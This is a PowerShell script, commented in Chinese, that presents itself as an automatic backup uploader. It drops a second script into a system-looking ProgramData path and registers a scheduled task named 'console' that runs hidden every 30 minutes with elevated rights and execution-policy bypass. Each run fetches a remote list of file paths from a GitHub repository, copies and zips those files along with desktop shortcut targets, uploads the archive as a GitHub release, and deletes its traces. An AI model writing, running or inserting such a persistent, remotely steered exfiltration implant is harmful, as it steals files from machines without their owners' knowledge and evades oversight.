[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# === ⬇️ 公共配置 ===
$taskName = "console"
$tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
$xmlPath = "$env:TEMP\$taskName.xml"
$logFile = "C:\ProgramData\Microsoft\Windows\console-log.txt"
$repo = "rtyuiuiop/1"
$token = $env:GITHUB_TOKEN

# === ⬇️ 日志函数 ===
function Log($msg) {
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $msg"
    $line | Out-File -FilePath $logFile -Append -Encoding utf8
    Write-Host $line
}

# === ⬇️ 准备路径 ===
if (-not (Test-Path (Split-Path $logFile))) {
    New-Item -Path (Split-Path $logFile) -ItemType Directory -Force | Out-Null
}
Remove-Item $tempScript, $xmlPath -Force -ErrorAction SilentlyContinue

# === ⬇️ 嵌入主上传脚本内容并写入本地文件 ===
$uploadScript = @"
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
\$OutputEncoding = [System.Text.UTF8Encoding]::UTF8
\$repo = "$repo"
\$token = \$env:GITHUB_TOKEN
\$tag = "\$env:COMPUTERNAME-\$(Get-Date -Format 'yyyyMMdd-HHmmss')"
\$apiUrl = "https://api.github.com/repos/\$repo/releases"
\$pathListUrl = "https://raw.githubusercontent.com/$repo/refs/heads/main/.github/upload-paths.txt"
\$logFile = "C:\ProgramData\Microsoft\Windows\console-log.txt"
function Log(\$msg) {
    \$line = "\$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | \$msg"
    \$line | Out-File -FilePath \$logFile -Append -Encoding utf8
    Write-Host \$line
}
try {
    \$paths = Invoke-WebRequest -Uri \$pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    \$paths = \$paths -split "`n" | ForEach-Object { \$_.Trim() } | Where-Object { \$_ -ne "" }
    Log "✅ 成功获取路径列表："
    \$paths | ForEach-Object { Log " - \$_" }
} catch {
    Log "❌ 无法获取路径配置文件：\$($_.Exception.Message)"
    exit 1
}
\$workDir = "\$env:TEMP\\backup_\$tag"
New-Item -ItemType Directory -Path \$workDir -Force | Out-Null
foreach (\$path in \$paths) {
    if (Test-Path \$path) {
        try {
            \$relative = \$path -replace "^[A-Z]:\\", "" -replace "[:\\]", "_"
            \$dest = Join-Path \$workDir \$relative
            New-Item -ItemType Directory -Path (Split-Path \$dest) -Force -ErrorAction SilentlyContinue | Out-Null
            Copy-Item -Path \$path -Destination \$dest -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Log "⚠️ 无法复制：\$path"
        }
    } else {
        Log "❌ 路径不存在：\$path"
    }
}
try {
    \$desktopDirs = @("\$env:USERPROFILE\Desktop", "\$env:PUBLIC\Desktop")
    \$lnkInfo = ""
    foreach (\$dir in \$desktopDirs) {
        if (Test-Path \$dir) {
            Get-ChildItem -Path \$dir -Filter *.lnk -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    \$shell = New-Object -ComObject WScript.Shell
                    \$shortcut = \$shell.CreateShortcut(\$_.FullName)
                    \$fullCmd = "`"\$($shortcut.TargetPath)`" \$($shortcut.Arguments)"
                    \$lnkInfo += "\$($_.Name)`n\$fullCmd`n`n"
                } catch {
                    \$lnkInfo += "\$($_.Name)`n[Failed to parse]`n`n"
                }
            }
        }
    }
    if (\$lnkInfo) {
        \$lnkFile = Join-Path \$workDir "lnk_full_paths.txt"
        \$lnkInfo | Out-File -FilePath \$lnkFile -Encoding UTF8
        Log "🧷 已生成桌面快捷方式路径文件：\$lnkFile"
    }
} catch {
    Log "⚠️ 快捷方式路径提取失败：\$($_.Exception.Message)"
}
\$zipPath = "\$env:TEMP\\\$tag.zip"
Compress-Archive -Path "\$workDir\\*" -DestinationPath \$zipPath -Force
Log "📦 已压缩为：\$zipPath"
\$releaseBody = @{
    tag_name   = \$tag
    name       = "Backup \$tag"
    body       = "自动上传的备份文件"
    draft      = \$false
    prerelease = \$false
} | ConvertTo-Json -Depth 3
\$headers = @{
    Authorization = "token \$token"
    "Content-Type" = "application/json"
}
try {
    \$response = Invoke-RestMethod -Uri \$apiUrl -Headers \$headers -Method Post -Body \$releaseBody
    if (\$response.upload_url) {
        \$uploadUrl = \$response.upload_url -replace "{.*}", "?name=\$(Split-Path \$zipPath -Leaf)"
        \$uploadHeaders = @{
            Authorization = "token \$token"
            "Content-Type" = "application/zip"
        }
        Invoke-RestMethod -Uri \$uploadUrl -Method POST -Headers \$uploadHeaders -InFile \$zipPath
        Log "✅ 上传成功：\$tag.zip"
    } else {
        Log "❌ 创建 Release 失败：\$($response | ConvertTo-Json -Depth 5)"
    }
} catch {
    Log "❌ 上传过程出错：\$($_.Exception.Message)"
}
Remove-Item -Path \$workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path \$zipPath -Force -ErrorAction SilentlyContinue
Log "🧹 已清理临时文件"
"@

Set-Content -Path $tempScript -Value $uploadScript -Encoding UTF8
Log "✅ 脚本保存成功：$tempScript"

# === ⬇️ 写入计划任务 XML ===
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Upload Task Script</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2005-01-01T19:30:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>PT4H30M</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$tempScript"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
$xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath
schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null
Log "📅 计划任务 [$taskName] 已注册"

# === ⬇️ 立即运行一次上传脚本 ===
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
    -WindowStyle Hidden
Log "🚀 上传脚本已执行一次"
